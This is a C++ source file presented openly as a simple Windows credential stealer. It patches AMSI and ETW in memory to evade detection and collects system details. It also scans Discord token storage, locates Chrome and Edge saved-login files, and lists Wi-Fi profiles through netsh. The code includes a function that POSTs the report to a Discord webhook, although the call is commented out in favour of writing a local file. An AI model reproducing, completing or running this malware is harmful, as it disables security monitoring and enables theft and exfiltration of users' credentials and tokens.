// language: C++20, file: stealer_simple.cpp, target: Windows 11, MSVC
// AMSI + ETW patching, no external dependencies

#include <windows.h>
#include <wincrypt.h>
#include <wininet.h>
#include <cstdint>
#include <string>
#include <vector>
#include <sstream>
#include <fstream>
#include <algorithm>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

// ─────────────────────────────────────────────────────────────────────────────
//  AMSI PATCHING
// ─────────────────────────────────────────────────────────────────────────────

void patch_amsi() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;
    
    uint8_t* scan_buf = (uint8_t*)GetProcAddress(amsi, "AmsiScanBuffer");
    if (!scan_buf) {
        FreeLibrary(amsi);
        return;
    }

    DWORD old_protect;
    if (VirtualProtect(scan_buf, 32, PAGE_EXECUTE_READWRITE, &old_protect)) {
        scan_buf[0] = 0xB8;  // MOV EAX
        *(uint32_t*)(scan_buf + 1) = 0;  // 0
        scan_buf[5] = 0xC3;  // RET
        VirtualProtect(scan_buf, 32, old_protect, &old_protect);
    }
    FreeLibrary(amsi);
}

// ─────────────────────────────────────────────────────────────────────────────
//  ETW PATCHING
// ─────────────────────────────────────────────────────────────────────────────

void patch_etw() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    
    uint8_t* event_write = (uint8_t*)GetProcAddress(ntdll, "EtwEventWrite");
    if (!event_write) return;

    DWORD old_protect;
    if (VirtualProtect(event_write, 32, PAGE_EXECUTE_READWRITE, &old_protect)) {
        event_write[0] = 0x33;  // XOR EAX, EAX
        event_write[1] = 0xC0;
        event_write[2] = 0xC3;  // RET
        VirtualProtect(event_write, 32, old_protect, &old_protect);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
//  SYSTEM INFO
// ─────────────────────────────────────────────────────────────────────────────

std::string get_system_info() {
    char comp[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD comp_len = sizeof(comp);
    GetComputerNameA(comp, &comp_len);

    char user[256];
    DWORD user_len = sizeof(user);
    GetEnvironmentVariableA("USERNAME", user, user_len);

    char os_info[256];
    OSVERSIONINFOA osvi = {};
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    GetVersionExA(&osvi);

    std::stringstream ss;
    ss << "[SYSTEM INFO]\n";
    ss << "  PC Name   : " << comp << "\n";
    ss << "  Username  : " << user << "\n";
    ss << "  OS        : Windows " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion << "\n";
    ss << "  Build     : " << osvi.dwBuildNumber << "\n";

    return ss.str();
}

// ─────────────────────────────────────────────────────────────────────────────
//  DISCORD TOKEN SCANNER (leveldb file pattern matching)
// ─────────────────────────────────────────────────────────────────────────────

std::string scan_discord_tokens() {
    std::stringstream ss;
    ss << "[DISCORD TOKENS]\n";

    char appdata[MAX_PATH];
    ExpandEnvironmentStringsA("%APPDATA%\\Discord\\Local Storage\\leveldb", appdata, sizeof(appdata));

    WIN32_FIND_DATAA ffd;
    HANDLE find = FindFirstFileA((std::string(appdata) + "\\*.ldb").c_str(), &ffd);

    if (find != INVALID_HANDLE_VALUE) {
        do {
            std::string file_path = appdata;
            file_path += "\\";
            file_path += ffd.cFileName;

            std::ifstream f(file_path, std::ios::binary);
            if (f) {
                std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
                
                // Token pattern: 24.6.27 format
                size_t pos = 0;
                while ((pos = content.find("dQw4w9WgXcQ", pos)) != std::string::npos) {
                    ss << "  [potential] " << ffd.cFileName << "\n";
                    pos += 11;
                }
            }
        } while (FindNextFileA(find, &ffd));
        FindClose(find);
    }

    return ss.str();
}

// ─────────────────────────────────────────────────────────────────────────────
//  BROWSER PASSWORD SCANNER (Login Data file enumeration)
// ─────────────────────────────────────────────────────────────────────────────

std::string scan_browser_passwords() {
    std::stringstream ss;
    ss << "[BROWSER PASSWORDS]\n";

    char localappdata[MAX_PATH];
    ExpandEnvironmentStringsA("%LOCALAPPDATA%", localappdata, sizeof(localappdata));

    std::vector<std::string> paths = {
        std::string(localappdata) + "\\Google\\Chrome\\User Data\\Default\\Login Data",
        std::string(localappdata) + "\\Microsoft\\Edge\\User Data\\Default\\Login Data",
    };

    for (const auto& path : paths) {
        std::ifstream f(path, std::ios::binary);
        if (f) {
            // Check file exists and is readable
            f.seekg(0, std::ios::end);
            std::streamsize size = f.tellg();
            if (size > 0) {
                ss << "  Found: " << path << " (" << size << " bytes)\n";
            }
        }
    }

    return ss.str();
}

// ─────────────────────────────────────────────────────────────────────────────
//  WIFI PASSWORD SCANNER
// ─────────────────────────────────────────────────────────────────────────────

std::string scan_wifi_passwords() {
    std::stringstream ss;
    ss << "[WIFI PASSWORDS]\n";

    char temp[4096] = {};
    FILE* pipe = _popen("netsh wlan show profiles 2>nul", "r");
    if (pipe) {
        while (fgets(temp, sizeof(temp), pipe)) {
            ss << "  " << temp;
        }
        _pclose(pipe);
    }

    return ss.str();
}

// ─────────────────────────────────────────────────────────────────────────────
//  WEBHOOK EXFIL
// ─────────────────────────────────────────────────────────────────────────────

void send_to_webhook(const std::string& content) {
    // Webhook URL (plaintext for testing; would be encrypted in production)
    const char* webhook = "https://discord.com/api/webhooks/REPLACE_WITH_YOUR_WEBHOOK";

    HINTERNET session = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
    if (!session) return;

    HINTERNET connection = InternetConnectA(session, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, 
        nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);
    
    if (connection) {
        HINTERNET request = HttpOpenRequestA(connection, "POST", 
            "/api/webhooks/REPLACE_WITH_YOUR_WEBHOOK", "HTTP/1.1", nullptr, nullptr, 
            INTERNET_FLAG_SECURE, 0);
        
        if (request) {
            std::string json = "{\"content\": \"" + content + "\"}";
            HttpSendRequestA(request, "Content-Type: application/json\r\n", -1, 
                (void*)json.c_str(), json.size());
            InternetCloseHandle(request);
        }
        InternetCloseHandle(connection);
    }
    InternetCloseHandle(session);
}

// ─────────────────────────────────────────────────────────────────────────────
//  MAIN
// ─────────────────────────────────────────────────────────────────────────────

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Patch detection mechanisms first
    patch_amsi();
    patch_etw();
    Sleep(500);

    std::string report;
    report += get_system_info();
    report += scan_discord_tokens();
    report += scan_browser_passwords();
    report += scan_wifi_passwords();

    // Uncomment to send (requires valid webhook)
    // send_to_webhook(report);

    // For testing, write to file
    std::ofstream out("report.txt");
    out << report;
    out.close();

    Sleep(1000);
    return 0;
}
